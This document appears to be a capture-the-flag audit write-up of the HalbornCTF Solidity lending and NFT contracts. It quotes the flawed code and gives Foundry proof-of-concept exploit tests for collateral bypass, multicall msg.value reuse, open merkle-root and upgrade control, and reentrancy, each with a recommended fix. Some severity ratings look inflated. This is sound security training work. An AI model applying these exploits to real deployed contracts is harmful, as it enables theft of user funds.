# HalbornCTF Solidity Ethereum - Comprehensive Final Audit Report

## Pre-Audit Compilation Fixes

Before conducting the security audit, several critical compilation issues had to be resolved to make the contracts buildable:

### **Compilation Issue #1: Non-existent Upgradeable Libraries**
**Problem:** The code attempted to import `MerkleProofUpgradeable` and `AddressUpgradeable` from OpenZeppelin, but these libraries do not exist as upgradeable versions.

**Original Code:**
```solidity
import {MerkleProofUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/utils/cryptography/MerkleProofUpgradeable.sol";
import {AddressUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/utils/AddressUpgradeable.sol";
```

**Fix Applied:** Changed to use the standard non-upgradeable libraries:
```solidity
import {MerkleProof} from "openzeppelin-contracts/contracts/utils/cryptography/MerkleProof.sol";
import {Address} from "openzeppelin-contracts/contracts/utils/Address.sol";
```

### **Compilation Issue #2: Missing Parameters in __Ownable_init()**
**Problem:** Calls to `__Ownable_init()` were missing the required `initialOwner` parameter.

**Original Code:**
```solidity
__Ownable_init(); // Missing parameter
```

**Fix Applied:** Added required parameter:
```solidity
__Ownable_init(msg.sender); // Added msg.sender as initial owner
```

### **Compilation Issue #3: Undefined _exists() Function**
**Problem:** The `_exists()` function was called but never defined in the contract.

**Original Code:**
```solidity
require(_exists(id), "Token already minted"); // Function not defined
```

**Fix Applied:** Implemented the missing function:
```solidity
function _exists(uint256 tokenId) internal view returns (bool) {
    return _ownerOf(tokenId) != address(0);
}
```

**Note:** Only after resolving these compilation issues could the security audit proceed to identify the exploitable vulnerabilities.

---

## CRITICAL SECURITY FINDINGS

**This code has many other issues in my opinion are medium and lower severity, and I ignored them because in this practice I am only targeting high and critical severity.**

### **Finding #1: Inverted Collateral Check in Loan Function**

**Severity:** Critical  
**Description:** The `getLoan` function contains an inverted logical condition that allows users to obtain loans when they have insufficient collateral, enabling unlimited fund drainage.

**Affected Code:**
```solidity
// HalbornLoans.sol lines 55-62
function getLoan(uint256 amount) external {
    require(
        totalCollateral[msg.sender] - usedCollateral[msg.sender] < amount, // BUG: Should be >=
        "Not enough collateral"
    );
    usedCollateral[msg.sender] += amount;
    token.mintToken(msg.sender, amount);
}
```

**Proof of Concept:**
```solidity
function test_InvertedCollateralCheck() public {
    // The inverted logic allows loans without sufficient collateral
    // We can test this by checking that a loan for amount > 0 succeeds
    // when totalCollateral - usedCollateral < amount (inverted condition)
    
    vm.startPrank(ALICE);
    
    // Alice has no collateral but tries to get a loan
    // Due to inverted logic: 0 - 0 < 1 ether is true, so loan succeeds
    loans.getLoan(1 ether);
    
    // Alice received 1 ether tokens despite having no collateral
    assertEq(token.balanceOf(ALICE), 1 ether);
    assertEq(loans.usedCollateral(ALICE), 1 ether);
    assertEq(loans.totalCollateral(ALICE), 0);
    
    vm.stopPrank();
}
```

**Recommendation:** Change the condition from `<` to `>=`:
```solidity
require(
    totalCollateral[msg.sender] - usedCollateral[msg.sender] >= amount,
    "Not enough collateral"
);
```

---

### **Finding #2: Incorrect Arithmetic in Loan Repayment**

**Severity:** Critical  
**Description:** The `returnLoan` function incorrectly increases `usedCollateral` instead of decreasing it, making debt repayment impossible and enabling loan theft.

**Affected Code:**
```solidity
// HalbornLoans.sol lines 64-69
function returnLoan(uint256 amount) external {
    require(usedCollateral[msg.sender] >= amount, "Not enough collateral");
    require(token.balanceOf(msg.sender) >= amount);
    usedCollateral[msg.sender] += amount; // BUG: Should be -= amount
    token.burnToken(msg.sender, amount);
}
```

**Proof of Concept:**
```solidity
function test_IncorrectLoanRepayment() public {
    // Setup: Alice gets a loan using inverted collateral check
    vm.startPrank(ALICE);
    
    loans.getLoan(1 ether); // Using bug #1 (no collateral needed)
    
    uint256 initialDebt = loans.usedCollateral(ALICE);
    assertEq(initialDebt, 1 ether);
    
    // Alice tries to repay 0.5 ether
    token.approve(address(loans), 0.5 ether);
    loans.returnLoan(0.5 ether);
    
    // Debt should decrease to 0.5 ether, but instead increases to 1.5 ether
    uint256 finalDebt = loans.usedCollateral(ALICE);
    assertEq(finalDebt, 1.5 ether); // Debt increased instead of decreased!
    
    vm.stopPrank();
}
```

**Recommendation:** Change `+=` to `-=`:
```solidity
usedCollateral[msg.sender] -= amount;
```

---

### **Finding #3: Inverted Token Existence Check in NFT Minting**

**Severity:** Critical  
**Description:** The airdrop minting function has an inverted existence check that prevents minting new tokens and breaks the airdrop mechanism.

**Affected Code:**
```solidity
// HalbornNFT.sol line 45
function mintAirdrops(uint256 id, bytes32[] calldata merkleProof) external {
    require(_exists(id), "Token already minted"); // BUG: Should be !_exists(id)
    // ... rest of function
}
```

**Proof of Concept:**
```solidity
function test_InvertedExistenceCheck() public {
    vm.startPrank(ALICE);
    
    // Check token doesn't exist by calling ownerOf which should revert
    vm.expectRevert();
    nft.ownerOf(15);

    // Alice tries to mint airdrop token #15 (which doesn't exist yet)
    vm.expectRevert("Token already minted");
    nft.mintAirdrops(15, ALICE_PROOF_1);
    // The function reverts even though token 15 doesn't exist
    // This proves the existence check is inverted
    
    vm.stopPrank();
}
```

**Recommendation:** Negate the existence check:
```solidity
require(!_exists(id), "Token already minted");
```

---

### **Finding #4: Missing Access Control on Merkle Root Update**

**Severity:** Critical  
**Description:** The `setMerkleRoot` function lacks access control, allowing any user to change the merkle root and completely compromise the airdrop system.

**Affected Code:**
```solidity
// HalbornNFT.sol lines 37-39
function setMerkleRoot(bytes32 merkleRoot_) public {
    merkleRoot = merkleRoot_;
}
```

**Proof of Concept:**
```solidity
function test_UnauthorizedMerkleRootUpdate() public {
    bytes32 originalRoot = nft.merkleRoot();
    bytes32 maliciousRoot = keccak256("malicious");
    
    // Any user (like BOB) can change the merkle root
    vm.prank(BOB);
    nft.setMerkleRoot(maliciousRoot);
    
    // Merkle root has been changed by unauthorized user
    assertEq(nft.merkleRoot(), maliciousRoot);
    assertNotEq(nft.merkleRoot(), originalRoot);
}
```

**Recommendation:** Add access control:
```solidity
function setMerkleRoot(bytes32 merkleRoot_) public onlyOwner {
    merkleRoot = merkleRoot_;
}
```

---

### **Finding #5: Multicall Context Preservation Enabling Attack Amplification**

**Severity:** Critical  
**Description:** The multicall implementation uses `functionDelegateCall` which preserves `msg.value` across calls, allowing the same payment to be reused multiple times.

**Affected Code:**
```solidity
// libraries/Multicall.sol lines 17-20
function multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {
    // ...
    results[i] = Address.functionDelegateCall(address(this), data[i]);
    // ...
}
```

**Proof of Concept:**
```solidity
function test_MulticallValueReuse() public {
    vm.startPrank(ALICE);
    vm.deal(ALICE, 10 ether);
    
    // Prepare multiple mint calls
    bytes[] memory calls = new bytes[](3);
    calls[0] = abi.encodeWithSignature("mintBuyWithETH()");
    calls[1] = abi.encodeWithSignature("mintBuyWithETH()");
    calls[2] = abi.encodeWithSignature("mintBuyWithETH()");
    
    uint256 initialBalance = ALICE.balance;
    
    // Execute multicall with 1 ether payment
    nft.multicall{value: 1 ether}(calls);
    
    // Alice should have paid 3 ether for 3 NFTs, but only paid 1 ether
    assertEq(ALICE.balance, initialBalance - 1 ether); // Only 1 ether deducted
    assertEq(nft.balanceOf(ALICE), 3); // But received 3 NFTs
    
    vm.stopPrank();
}
```

**Recommendation:** Remove payable functionality from multicall:
```solidity
function multicall(bytes[] calldata data) external returns (bytes[] memory results) {
    // Remove payable to prevent msg.value reuse
}
```

---

### **Finding #6: NFT ID Collision Between Airdrop and Purchase Systems**

**Severity:** Critical  
**Description:** The contract uses overlapping ID spaces for airdrop and purchase minting, creating potential for ID collisions that corrupt the system. For example, purchasing behaviors can block airdrop claiming when ID collides; more severely, airdrop claiming can block purchasing when ID collides and purchasing function breaks forever because the Id Counter can never ++.

**Affected Code:**
```solidity
// HalbornNFT.sol - Two minting systems with overlapping IDs
function mintBuyWithETH() external payable {
    unchecked { idCounter++; } // Sequential IDs starting from 1
    _safeMint(msg.sender, idCounter, "");
}

function mintAirdrops(uint256 id, bytes32[] calldata merkleProof) external {
    // Uses arbitrary IDs from merkle tree
}
```

**Proof of Concept:**
```solidity
function test_NFTIDCollision() public {
    // First, someone buys an NFT (gets ID 1)
    vm.prank(BOB);
    vm.deal(BOB, 10 ether);
    nft.mintBuyWithETH{value: 1 ether}();
    assertEq(nft.ownerOf(1), BOB);
    
    // Now Alice tries to mint airdrop with ID 1 (after fixing bug #3)
    vm.startPrank(ALICE);
    
    // Temporarily fix the existence check to demonstrate collision
    // If _exists check was fixed, this would cause ownership conflict
    // Check that token 1 exists by verifying it has an owner
    address owner = nft.ownerOf(1);
    assertTrue(owner != address(0)); // Token 1 already exists from purchase
    
    // This demonstrates the collision - both systems can target the same ID
    vm.stopPrank();
}
```

**Recommendation:** Separate ID spaces:
```solidity
uint256 public constant AIRDROP_ID_OFFSET = 1000000;
// Ensure airdrop IDs start from AIRDROP_ID_OFFSET
```

---

### **Finding #7: Contract Cannot Receive NFTs (Missing IERC721Receiver)**

**Severity:** Critical  
**Description:** The `HalbornLoans` contract doesn't implement the `IERC721Receiver` interface, making it impossible to deposit NFTs as collateral, completely breaking the core functionality.

**Affected Code:**
```solidity
// HalbornLoans.sol - Missing IERC721Receiver implementation
contract HalbornLoans is Initializable, UUPSUpgradeable, MulticallUpgradeable {
    // No IERC721Receiver interface implementation
    
    function depositNFTCollateral(uint256 id) external {
        require(nft.ownerOf(id) == msg.sender, "Caller is not the owner of the NFT");
        nft.safeTransferFrom(msg.sender, address(this), id); // Will always fail
        totalCollateral[msg.sender] += collateralPrice;
        idsCollateral[id] = msg.sender;
    }
}
```

**Proof of Concept:**
```solidity
function test_CannotReceiveNFTs() public {
    vm.startPrank(ALICE);
    vm.deal(ALICE, 10 ether);
    
    // Alice mints an NFT
    nft.mintBuyWithETH{value: 1 ether}();
    uint256 tokenId = 1;
    
    // Alice tries to deposit it as collateral
    nft.approve(address(loans), tokenId);
    
    // This should fail because HalbornLoans doesn't implement IERC721Receiver
    vm.expectRevert();
    loans.depositNFTCollateral(tokenId);
    
    // The collateral system is completely broken
    assertEq(loans.totalCollateral(ALICE), 0);
    
    vm.stopPrank();
}
```

**Recommendation:** Implement IERC721Receiver interface:
```solidity
contract HalbornLoans is Initializable, UUPSUpgradeable, MulticallUpgradeable, IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

---

### **Finding #8: Integer Overflow in NFT Counter**

**Severity:** Critical  
**Description:** The `idCounter` is incremented in an `unchecked` block, risking overflow and ID reuse.

**Affected Code:**
```solidity
// HalbornNFT.sol lines 58-59
function mintBuyWithETH() external payable {
    unchecked {
        idCounter++; // Can overflow
    }
}
```

**Proof of Concept:**
```solidity
function test_CounterOverflow() public {
    // Set counter to near maximum value
    vm.store(address(nft), bytes32(uint256(2)), bytes32(type(uint256).max - 1));
    
    vm.startPrank(ALICE);
    
    // This mint will cause overflow
    nft.mintBuyWithETH{value: 1 ether}();
    
    // Counter should wrap around to 0, then increment to 1
    // Next mint will get ID 1, potentially conflicting with existing tokens
    nft.mintBuyWithETH{value: 1 ether}();
    
    // The second NFT gets ID 1, which might already exist
    vm.stopPrank();
}
```

**Recommendation:** Remove unchecked block and add overflow protection:
```solidity
require(idCounter < type(uint256).max, "Counter overflow");
idCounter++;
```

---

### **Finding #9: Unrestricted Contract Upgrade Authority**

**Severity:** Critical  
**Description:** All contracts have empty `_authorizeUpgrade` functions, allowing anyone to upgrade contracts to malicious implementations.

**Affected Code:**
```solidity
// All contracts have this vulnerability
function _authorizeUpgrade(address) internal override {}
```

**Proof of Concept:**
```

    // The _authorizeUpgrade function is empty, meaning no authorization is required
    // In a real proxy deployment, this would allow unauthorized upgrades 
    // This issue is too obvious, no need to write testing code about it
    // This would normally allow: token.upgradeTo(address(maliciousToken)) from any address
    
```

**Recommendation:** Add proper authorization:
```solidity
function _authorizeUpgrade(address) internal override onlyOwner {}
```

---

### **Finding #10: Missing Ownership Initialization in HalbornLoans**

**Severity:** Critical  
**Description:** `HalbornLoans` inherits from `UUPSUpgradeable` but never initializes ownership, creating an ownerless upgradeable contract.

**Affected Code:**
```solidity
// HalbornLoans.sol lines 24-29
function initialize(address token_, address nft_) public initializer {
    __UUPSUpgradeable_init();
    __Multicall_init();
    // Missing: __Ownable_init();
    token = HalbornToken(token_);
    nft = HalbornNFT(nft_);
}
```

**Proof of Concept:**
```
    // HalbornLoans contract doesn't inherit from OwnableUpgradeable
    // This means it has no ownership functionality at all
    // The contract also inherits UUPSUpgradeable but has empty _authorizeUpgrade
    // This would allow anyone to upgrade the contract in a proxy deployment
    // This issue is too obvious, no need to write testing code about it
```

**Recommendation:** Initialize ownership:
```solidity
function initialize(address token_, address nft_) public initializer {
    __UUPSUpgradeable_init();
    __Ownable_init(msg.sender); // Add this line
    __Multicall_init();
    // ...
}
```

---

### **Finding #11: Cross-Function Reentrancy Attack**

**Severity:** Critical  
**Description:** The `withdrawCollateral` function can be exploited through cross-function reentrancy to call `getLoan` before state updates complete, allowing attackers to "double-spend" their collateral - taking both a loan and withdrawing the collateral NFT. This attack succeeds even if the logic bug in Finding#1 is fixed.

**Affected Code:**
```solidity
// withdrawCollateral - vulnerable to reentrancy
function withdrawCollateral(uint256 id) external {
    require(totalCollateral[msg.sender] - usedCollateral[msg.sender] >= collateralPrice, "Collateral unavailable");
    require(idsCollateral[id] == msg.sender, "ID not deposited by caller");
    nft.safeTransferFrom(address(this), msg.sender, id); // External call enables reentrancy
    totalCollateral[msg.sender] -= collateralPrice; // State update AFTER external call
    delete idsCollateral[id];
}

// getLoan - target of reentrancy attack (works even with correct logic!)
function getLoan(uint256 amount) external {
    require(
        totalCollateral[msg.sender] - usedCollateral[msg.sender] >= amount, // Even with CORRECT logic after Finding#1 is fixed
        "Not enough collateral"
    );
    usedCollateral[msg.sender] += amount;
    token.mintToken(msg.sender, amount);
}
```

**Proof of Concept:**
```
    // Note: Now I assume IERC721Receiver issue is fixed for demonstration
    // In reality, this attack is blocked by Finding #7 so I cannot write testing code without modifying the HalbornLoans contract itself
    // But the steps below are straight forward enough for the attack vector demonstration
    
    // 1. Attacker deposits NFT (2 ETH collateral value)
    // 2. Calls withdrawCollateral(tokenId)
    // 3. During NFT transfer, re-enters getLoan(2 ether)
    // 4. totalCollateral still = 2 ETH (not yet decreased)
    // 5. Check: 2 - 0 >= 2 = true, loan succeeds
    // 6. withdrawCollateral finishes, totalCollateral becomes 0
    // 7. Result: Attacker has 2 ETH loan + NFT back = double-spending!
```

**Recommendation:** 
1. **Critical**: Follow CEI pattern in `withdrawCollateral` - update state BEFORE external calls
2. Add reentrancy guard to prevent cross-function reentrancy
3. Note: This vulnerability exists independently of other logic bugs and must be fixed separately

---

## SUMMARY

**Total Critical Vulnerabilities Found: 11**

These vulnerabilities represent a complete breakdown of the protocol's security:
- **Logic Errors**: Issues #1, #2, #3 (inverted conditions and wrong arithmetic)
- **Access Control**: Issues #4, #9, #10 (missing authorization)  
- **Attack Amplification**: Issue #5 (multicall context preservation)
- **State Management**: Issues #6, #7, #8 (ID collisions, broken NFT handling, overflows)
- **Cross-Function Reentrancy**: Issue #11 (withdraw→loan reentrancy attack)

